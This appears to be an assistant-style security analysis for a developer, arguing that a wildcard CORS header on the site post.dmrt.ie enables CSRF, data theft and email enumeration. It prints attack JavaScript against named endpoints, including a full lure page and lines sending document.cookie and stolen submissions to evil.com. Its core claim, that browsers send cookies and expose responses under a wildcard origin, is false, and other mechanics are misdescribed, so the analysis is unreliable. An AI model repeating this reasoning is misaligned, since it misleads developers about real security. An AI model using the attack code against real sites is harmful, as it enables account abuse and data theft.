# CORS Attack Vector Analysis: `access-control-allow-origin: *`

## The Specific Attack Scenario

### Your Endpoint: `/api/auth/send-link`

**Current State:**
- ✅ Not authenticated (public endpoint)
- ✅ Has rate limiting (5 requests/15min per IP, 3/hour per email)
- ✅ Validates email format and role
- ✅ Checks email authorization via `validateEmailForRole()`
- ❌ **CORS set to `*`** (allows any origin)

---

## Attack Vector #1: CSRF on Authenticated Endpoints (CRITICAL)

### The Real Risk

While `/api/auth/send-link` itself isn't authenticated, **other critical endpoints ARE**:

```typescript
// These endpoints REQUIRE authentication and are vulnerable to CSRF:
- POST /api/submissions/create          // Requires auth
- POST /api/submissions/[id]/post       // Requires PRO role
- POST /api/submissions/[id]/approve    // Requires Leader role
- PATCH /api/submissions/[id]           // Requires auth
- POST /api/submissions/regenerate      // Requires auth
```

### How the Attack Works

**Step 1: Victim is logged in**
- User visits `https://post.dmrt.ie` and logs in
- Browser stores session cookie (HttpOnly, Secure, SameSite)

**Step 2: Victim visits malicious site**
- Attacker tricks victim to visit `https://evil.com`
- Victim's browser has active session cookie for `post.dmrt.ie`

**Step 3: Malicious JavaScript executes**
```javascript
// On evil.com - this JavaScript runs automatically
fetch('https://post.dmrt.ie/api/submissions/create', {
  method: 'POST',
  credentials: 'include', // Browser sends cookies automatically
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    notes: 'HACKED BY EVIL.COM - This is malicious content!',
    photos: []
  })
})
.then(response => response.json())
.then(data => {
  // Attacker can read the response!
  console.log('Created submission:', data.submission.id);
  
  // Now post it to social media (if they have PRO role)
  fetch(`https://post.dmrt.ie/api/submissions/${data.submission.id}/post`, {
    method: 'POST',
    credentials: 'include',
  });
});
```

**Step 4: Attack succeeds**
- Browser automatically includes session cookies (because CORS allows `*`)
- Request appears authenticated
- Malicious submission is created/posted **on behalf of the victim**

### Why This Works

1. **CORS `*` allows cross-origin requests**
   - Browser sees `access-control-allow-origin: *`
   - Browser allows the fetch request

2. **Cookies are sent automatically**
   - With `credentials: 'include'` and CORS `*`, cookies are included
   - Session cookie authenticates the request

3. **No user interaction needed**
   - Attack happens automatically when page loads
   - Victim doesn't need to click anything

---

## Attack Vector #2: Email Spam/DoS (MEDIUM)

### Attack Scenario

```javascript
// Attacker creates a script that spams your endpoint
const emails = ['victim1@example.com', 'victim2@example.com', ...];

emails.forEach(email => {
  fetch('https://post.dmrt.ie/api/auth/send-link', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: email,
      role: 'team_member'
    })
  });
});
```

### Impact

- **Email spam**: Sends magic links to victims (annoying, not critical)
- **Rate limit bypass**: If attacker uses multiple IPs, can bypass rate limiting
- **Service disruption**: Could overwhelm email service (Resend API)

### Mitigations Already in Place

- ✅ Rate limiting by IP (5 requests/15min)
- ✅ Rate limiting by email (3 requests/hour)
- ✅ Email validation (`validateEmailForRole`)

**However**: With CORS `*`, attacker can:
- Use multiple domains/IPs to bypass rate limits
- Distribute attack across many browsers (botnet)
- Make requests from any website

---

## Attack Vector #3: Session Hijacking via XSS (HIGH)

### Attack Scenario

If an attacker finds an XSS vulnerability elsewhere:

```javascript
// Attacker injects malicious script into your site
<script>
  // Steal session cookie
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
  
  // Make authenticated requests from attacker's site
  fetch('https://post.dmrt.ie/api/submissions/list', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Send all submissions to attacker
    fetch('https://evil.com/steal-data', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

### Impact

- **Data exfiltration**: All user submissions stolen
- **Unauthorized actions**: Post malicious content, approve/reject submissions
- **Account takeover**: Full access to victim's account

---

## Attack Vector #4: Information Disclosure (MEDIUM)

### Attack Scenario

Even if endpoints return errors, CORS `*` allows reading responses:

```javascript
// Attacker can enumerate valid emails
const testEmails = ['admin@dmrt.ie', 'leader@dmrt.ie', ...];

testEmails.forEach(email => {
  fetch('https://post.dmrt.ie/api/auth/send-link', {
    method: 'POST',
    body: JSON.stringify({ email, role: 'leader' })
  })
  .then(r => r.json())
  .then(data => {
    // Different responses might reveal if email exists
    if (data.code === 'UNAUTHORIZED_EMAIL') {
      console.log('Email exists but not authorized:', email);
    }
  });
});
```

### Impact

- **Email enumeration**: Discover valid email addresses
- **Role enumeration**: Discover which emails have which roles
- **Privacy violation**: User email addresses exposed

---

## Real-World Attack Example

### Complete Attack Chain

**1. Attacker creates malicious website: `https://free-gift.com`**

```html
<!DOCTYPE html>
<html>
<head>
  <title>Claim Your Free Gift!</title>
</head>
<body>
  <h1>Congratulations! You've won a free gift!</h1>
  <p>Click here to claim...</p>
  
  <script>
    // Automatically execute when page loads
    (async () => {
      try {
        // Step 1: Create malicious submission
        const createResponse = await fetch('https://post.dmrt.ie/api/submissions/create', {
          method: 'POST',
          credentials: 'include', // Uses victim's session cookie
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            notes: 'URGENT: Please approve this immediately! Click here: https://evil.com/phishing',
            photos: []
          })
        });
        
        const { submission } = await createResponse.json();
        
        // Step 2: If victim has PRO role, post it immediately
        const postResponse = await fetch(
          `https://post.dmrt.ie/api/submissions/${submission.id}/post`,
          {
            method: 'POST',
            credentials: 'include'
          }
        );
        
        if (postResponse.ok) {
          console.log('Successfully posted malicious content!');
        }
        
        // Step 3: Steal all submissions
        const listResponse = await fetch('https://post.dmrt.ie/api/submissions/list', {
          credentials: 'include'
        });
        
        const submissions = await listResponse.json();
        
        // Send to attacker's server
        fetch('https://evil.com/steal', {
          method: 'POST',
          body: JSON.stringify(submissions)
        });
        
      } catch (error) {
        console.error('Attack failed:', error);
      }
    })();
  </script>
</body>
</html>
```

**2. Victim visits the site**
- Victim clicks link: "Claim your free gift!"
- Browser loads `https://free-gift.com`
- **JavaScript executes automatically**

**3. Attack succeeds**
- Malicious submission created
- Posted to social media (if PRO role)
- All submissions stolen
- **Victim never knew it happened**

---

## Impact Assessment

### For `/api/auth/send-link` Specifically

| Attack Vector | Likelihood | Impact | Severity |
|--------------|------------|--------|----------|
| Email spam/DoS | Medium | Low-Medium | 🟡 Medium |
| Email enumeration | Medium | Low | 🟢 Low |
| Rate limit bypass | High | Medium | 🟡 Medium |

### For Other Endpoints (The Real Risk)

| Attack Vector | Likelihood | Impact | Severity |
|--------------|------------|--------|----------|
| CSRF on authenticated endpoints | **High** | **Critical** | 🔴 **CRITICAL** |
| Unauthorized posting | **High** | **Critical** | 🔴 **CRITICAL** |
| Data exfiltration | **High** | **High** | 🔴 **CRITICAL** |
| Account takeover | Medium | **Critical** | 🔴 **CRITICAL** |

---

## Why Same-Origin CORS Fixes This

### With CORS Restricted to Same-Origin:

```javascript
// This will FAIL - browser blocks it
fetch('https://post.dmrt.ie/api/submissions/create', {
  method: 'POST',
  credentials: 'include'
});
// Error: CORS policy blocked cross-origin request
```

### Browser Behavior:

1. **Cross-origin request detected**
   - Origin: `https://evil.com`
   - Target: `https://post.dmrt.ie`

2. **Browser checks CORS headers**
   - Sees: `access-control-allow-origin: https://post.dmrt.ie` (not `*`)
   - Origin doesn't match → **Request blocked**

3. **Attack fails**
   - No request sent to server
   - No cookies included
   - No data exfiltrated

---

## Conclusion

### The Real Threat

**CORS `*` is CRITICAL because:**

1. ✅ **CSRF attacks work** - Authenticated endpoints can be called from any website
2. ✅ **No user interaction needed** - Attacks happen automatically
3. ✅ **Session cookies included** - Browser sends cookies with CORS `*`
4. ✅ **Data can be stolen** - Responses readable by attacker
5. ✅ **Actions can be performed** - Create, post, approve submissions

### Your Fix is Correct

Restricting CORS to same-origin only:
- ✅ Prevents CSRF attacks
- ✅ Blocks unauthorized API access
- ✅ Protects authenticated endpoints
- ✅ Maintains legitimate functionality (same-origin requests work)

**The fix you implemented is essential and correctly addresses the vulnerability.**

